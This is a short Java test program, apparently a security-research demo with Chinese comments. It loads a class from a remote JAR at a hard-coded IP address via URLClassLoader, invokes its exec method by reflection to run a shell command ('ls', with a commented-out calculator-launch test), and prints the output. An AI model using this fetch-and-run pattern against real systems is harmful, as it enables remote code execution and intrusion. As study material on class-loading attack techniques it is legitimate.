import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.InvocationTargetException;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLClassLoader;

public class TestURLClassLoader {
    public static void main(String[] args) throws IOException,
            ClassNotFoundException,
            NoSuchMethodException, InvocationTargetException, IllegalAccessException {

        URL url = new URL("http://103.218.243.197:10091/CMD.jar");

        URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{url});

//        String cmd = "open -a calculator";
        String cmd = "ls";

        Class cmdClass = urlClassLoader.loadClass("CMD");

        //反射调用，因为是静态方法，所以无需传入实例
        Process process = (Process) cmdClass.getMethod("exec",String.class).invoke(null,cmd);

        //获取命令执行结果
        InputStream inputStream = process.getInputStream();
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        byte[] b = new byte[1024];
        int index = -1;
        while ((index = inputStream.read(b)) != -1){
            byteArrayOutputStream.write(b,0,index);
        }
        System.out.println(byteArrayOutputStream.toString());
    }
}
